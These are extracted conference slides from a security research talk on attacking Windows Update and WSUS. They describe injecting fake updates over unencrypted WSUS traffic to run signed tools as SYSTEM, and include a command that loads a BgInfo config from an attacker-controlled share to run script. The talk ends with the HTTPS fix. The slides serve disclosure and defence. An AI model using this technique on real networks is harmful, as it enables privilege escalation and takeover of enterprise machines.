WSUSPect ­ Compromising the Windows Enterprise via Windows Update
Paul Stone Alex Chapman
20/07/2015

Agenda
 Why look at Windows Update?  Exploring Windows Update attack surface  Installing drivers via Windows Update  Exploring WSUS  Compromising WSUS deployments  Fixes
20/07/2015

Who are We
 Context Information Security  Alex Chapman
 Paul Stone
20/07/2015

Why look at Windows Update?
 Find out why it's so damn slow
20/07/2015

Why look at Windows Update?
 Updates can often be installed by non-privileged users (PIC?) ­ Potential for Elevation-of-Privilege vulnerabilities
 Increases (and decreases) Windows attack surface (PIC?) ­ Updates are necessary to patch security flaws ­ Fetching and running code over the network tricky to do securely
 Non-Microsoft code available via Windows Update (PIC?) ­ Many 3rd party hardware drivers available via Windows Update ­ Kernel drivers ­ Privileged services and other code
 Because it's so dull few people have look at it before (PIC?)
20/07/2015

Overview of Windows Update
 Windows Update Service  Runs wuauclt.exe  Registry keys control various details
­ Update server, update frequency, elevate non-admins etc.  Talks to WU Servers via HTTPS / SOAP XML web service  Keeps a local database of installed / available updates
­ C:\Windows\SoftwareDistribution\DataStore\DataStore.edb  Updates are downloaded and unpacked to:
­ C:\Windows\SoftwareDistribution\Download  Logs are kept, helpful for debugging:
­ C:\Windows\WindowsUpdate.log
20/07/2015

What types of update are available?
Microsoft Update Classifications:  Critical Updates  Security Updates  Definition Updates  Updates  Drivers  Update Rollups  Service Packs
20/07/2015

What types of update are available?
Microsoft Update Classifications:  Critical Updates  Security Updates  Definition Updates  Updates  Drivers  Update Rollups  Service Packs
20/07/2015

Hardware Drivers
 Default Windows behaviour it to download and install drivers for new devices
20/07/2015

3rd Party Software
 Hardware vendors can submit drivers to be distributed via WU  Drivers must be signed, though not necessarily by Microsoft
"Your company's quality assurance processes are responsible for testing driver functionality during product development. When the driver is complete, you can verify that the driver is compatible with Windows and submit it to the Windows Certification Program for certification or digital signature. Any signed drivers may be distributed on Windows Update, regardless of whether the digital signature is obtained through certification, or through unclassified or "Other Device" testing."
- Driver Signing Guidelines for ISVs
20/0h7t/t2p01s5://msdn.microsoft.com/en-us/library/windows/hardware/dn631788.aspx

Driver Installation Process
 Device plugged in  PnP detects new device, adds it to Windows' device tree  Driver may be recognised (e.g. generic HID device) or not  Windows Update Service sends complete device tree to WU Server  WU Server responds with list of applicable updates (if any)  WU Service downloads and installs driver update(s)
 TODO ­ need procmon process graph
20/07/2015

Possible Attack Vector
 Give someone a malicious USB device  Spoofs ID of a particular USB device  Triggers download install of driver from Windows Update  ???
 Need to investigate available USB drivers
20/07/2015

How do we find all USB drivers on WU?
 Buy many USB devices, see if they have driver on WU ­ Many don't have drivers on WU ­ Too expensive
20/07/2015

How do we find all USB drivers on WU?
 Use programmable hardware to enumerate all possible USB device IDs ­ Facedancer ­ Beaglebone (using Linux GadgetFS) ­ Too slow for testing 1000's of hardware IDs
20/07/2015

How do we find all USB drivers on WU?
 Search Windows Update?  But no search interface inside Windows  Can only check for updates that apply to your current OS / hardware  WSUS local database has some drivers but not many
20/07/2015

Microsoft Update Catalog
 http://catalog.update.microsoft.com  Requires IE 6 or above  Requires an ActiveX control  Apparently untouched since 2001  But contains updates for all Windows versions from XP / 2000 onwards
20/07/2015

Microsoft Update Catalog
20/07/2015

Microsoft Update Catalog
 Can search based on USB Vendor ID (VID) and Product ID (PID) ­ ... or just search on VID e.g. USB\VID_1234
20/07/2015

The Plan
 Get a list of USB Vendor IDs  Scrape Windows Update Catalog
­ find every USB driver for every Vendor ID ­ Make a database of driver details  Download every driver for Windows 7 onwards  ???
20/07/2015

Scraping Results (~April 2015)
20/07/2015

Scraping Results (~April 2015)
 425 unique USB Vendor IDs  25,125 unique driver update GUIDs  4,687 unique download URLs / download hashes
 Many duplicates  Many obsolete driver versions
 Downloaded 2,284 drivers  ~5 GB worth of .cab files  Range of sizes from >100MB to a few KB
20/07/2015

Scraping Results (~April 2015)
 Lots of standard devices ­ Printers ­ Memory Cards ­ USB Ethernet ­ Bluetooth
 Lots of weird and wonderful sounding hardware ­ Infineon XC800 USB Debug ­ STMicroelectronics - Intel(R) Sensor Solution Blue Box DFU ­ DisplayLink Corp. Display Adapter (03B2)
 Many funky drivers were really just USB to serial drivers  Some `drivers' just used built-in drivers, configured some settings
20/07/2015

Contents of a Windows driver .cab file
 CAB is Microsoft's old-skool compressed archive format
20/07/2015

Contents of a Windows driver .cab file
 Driver .inf file(s) ­ List of supported hardware ­ List of things to do · Configure driver · Copy files · Set registry keys · Install kernel and userland services · Run co-installer ·...
20/07/2015

Contents of a Windows driver .cab file
 Windows Security Catalogs - .cat files ­ File hashes, signature and certificate for contents of .cab
20/07/2015

Contents of a Windows driver .cab file
 .sys files ­ Kernel drivers  .dlls, .exes, Help files...  Stuff the developer forgot to remove
­ .pdb files  32-bit and 64-bit versions of everythin
20/07/2015

The Plan
 Get a list of USB Vendor IDs  Scrape Windows Update Catalog
­ find every USB driver for every Vendor ID ­ Make a database of driver details  Download every driver for Windows 7 onwards  ???
20/07/2015

Automatically Installing Drivers
 Use Windows Device Console - DevCon.exe  Found in Windows Driver Development Kit (DDK)  Can run standalone
> devcon install cabdir\driver.inf USB\VID_1234&PID_5678 Device node created. Install is complete when drivers are installed... Updating drivers for USB\VID_04F9&PID_02FA&MI_02 from cabdir\brpoi13a.inf. Drivers installed successfully. > _
20/07/2015

Automatically Installing Drivers
 Used VirtualBox and VBoxManage to automate it via cmdline  Resume VM snapshot  Launch script via PsExec from host  Run SysInternals' ProcMon to capture activity  Run devcon  Record details before and after driver install
­ Services ­ Processes ­ Directory listings ­ Program Files, Windows, System32 ­ Take screenshot ­ etc.. 20/07R/2e01p5 eat for every driver

Automated Driver Installation
 Using DevCon doesn't fully simulate plugging in a USB device  Must be run as high-priv user  What happens when low-priv users plug in USB devices?  Can we simulate this without hardware?
20/07/2015

Interesting Results
 Some drivers didn't have correct signatures  Some drivers caused a bluescreen
20/07/2015

Windows Device Simulation Framework
 Part of Windows DDK  Allows full software simulation of USB devices  Discontinued in DDK version 8.0  Last available version in 7.1  Documentation is hard to find on Google  Comes with COM-scriptable pre-compiled example devices:
­ Generic HID device ­ USB Audio device ­ Keyboard device  https://msdn.microsoft.com/en-us/library/ff538295.aspx
20/07/2015

Scripting DSF Sample Devices
 Use the ISoftUSBDevice interface to set Vendor, Product IDs
20/07/2015

Driver Attacks in Enterprise Setting
 In enterprise/corporate setting, WSUS is generally in use  Some device drivers are available through WSUS, but they must
generally be approved by admin  Plugging in a random USB device often won't do much  USB whitelisting may be in use
 Let's look at WSUS again
20/07/2015

WSUS ­ Windows Software Update Services
 Pretty much identical to Windows Update  Similar SOAP XML web service  Updates fetched from local server instead of Microsoft server  Updates must be approved by administrator before being pushed out  Let's look at the web service
20/07/2015

Proxying WSUS
 If HTTPS in use, must put proxy CA cert into Machine cert store  Windows Update respects user proxy settings  May need to restart Windows Update service after configuring proxy
 Main endpoint is http://wsus-server/ClientWebService/client.asmx
 SOAP web service is documented at: https://msdn.microsoft.com/en-us/library/cc251937.aspx
20/07/2015

WSUS SOAP Service - Setup

GetConfig GetAuthorizationCookie

GetConfigResponse

GetAuthorizationCookieResponse

Client Client.asmx
SimpleAuth.asmx

GetCookie RegisterComputer

GetCookieResponse

20/07/2015

RegisterComputerResponse

Client Client.asmx

WSUS SOAP Service ­ Checking for Updates
SyncUpdates (list of currently installed updates) SyncUpdatesResult (list of new updates)
SyncUpdates (list of installed hardware and drivers) SyncUpdatesResult (list of new drivers)
GetExtendedUpdateInfo GetExtendedUpdateInfoResult
20/07/2015

SyncUpdates Request
List of installed / known updates

SyncUpdates Response
0 or more UpdateInfo tags

20/07/2015

Update Metadata, encoded XML inside Xml tag

SyncUpdates Response ­ Update Metadata
Must have these installed
Check file versions, registry keys etc...
20/07/2015

GetExtendedUpdateInfo Request
Need details on these updates
20/07/2015

GetExtendedUpdateInfo Response
Extended Metadata

20/07/2015

Hash and URL of each update

GetExtendedUpdateInfo Extended Metadata
Different types of `handler'
Files needed for update
20/07/2015

WSUS Security
 Windows Server 2012 WSUS Setup Wizard  SSL not enabled by default  Microsoft does recommends using SSL
20/07/2015

WSUS Security
"WSUS uses SSL for metadata only, not for update files. This is the same way that Microsoft Update distributes updates. Microsoft reduces the risk of sending update files over an unencrypted channel by signing each update. In addition, a hash is computed and sent together with the metadata for each update. When an update is downloaded, WSUS checks the digital signature and hash. If the update has been changed, it is not installed."
https://technet.microsoft.com/en-us/library/hh852346.aspx
 All updates must be signed by Microsoft
20/07/2015

WSUS Attacks
 If SSL not used we could MITM update traffic  Updates are signed so cannot be modified  Prevent updates being applied?  Force drivers to be downloaded and installed?  Remove security patches then attack system?
20/07/2015

Update Handlers
 Cbs ­ Cab-based patch  WindowsDriver  WindowsInstaller  WindowsPatch  InfBasedInstallation  CommandLineInstallation
20/07/2015

Update Handlers
 Cbs ­ Cab-based patch  WindowsDriver  WindowsInstaller  WindowsPatch  InfBasedInstallation  CommandLineInstallation
20/07/2015

CommandLineInstallation
20/07/2015

WSUS Attacks - CommandLineIntallation
 We can download and run any Microsoft-signed exe  We can provide arbitrary command-line arguments  Updates get installed as SYSTEM
 Lets download and run cmd.exe!  Most Windows binaries not signed   But SysInternals tools are!  Let's use PsExec!
20/07/2015

Client MITM attacker WSUS Server

Injecting a fake update
SyncUpdates SyncUpdatesResult + fake update

GetExtendedUpdateInfo Fake GetExtendedUpdateInfoResult

Request PsExec

20/07/2015

PsExec.exe

SyncUpdatesResult

Injecting a fake update
20/07/2015

20/07/2015

WSUS Attack Demo ­ Scenario 1
 Client PC configured to use WSUS over HTTP  User can modify proxy settings  Malicious low-priv user
20/07/2015

PsExec Problems
 Sophos detects it as a `Hacking Tool'  May get blocked on enterprise systems  What else could we use?
20/07/2015

SysInternals BgInfo
 Frequently used on enterprise machines
20/07/2015

SysInternals BgInfo
 Can run VBScript to populate fields  Can load config file from network share
bginfo \\attacker\share\config.bgi /nolicprompt /timer:0
20/07/2015

WSUS Attack Demo ­ Scenario 2
 Attacker has access to corporate subnet  Attacker has no domain creds  Attacker can performs ARP spoofing / WPAD injection
20/07/2015

Check for WSUS HTTP misconfiguration
 Check registry on WSUS client machines  HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate
­ WUServer = http://wsus-server.local:8530
 HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU ­ UseWUServer = 1 ­ Computer will use WUServer setting
 Or check Group Policy ­ Windows Components > Windows Update > Specify intranet Microsoft update service location
20/07/2015

Fix WSUS HTTP Misconfiguration
 RTFM ­ Microsoft recommends, but doesn't enforce HTTPS ­ https://technet.microsoft.com/library/hh852346.aspx#bkmk_3_ 5_ConfigSSL
20/07/2015

Thanks
 Jan Tudor  Ruben Boonen (@FuzzySec)  Andy Monaghan  Context
20/07/2015

So why IS Windows Update so slow?

20/07/2015

No idea, sorry! ¯\_()_/¯

Any Questions?

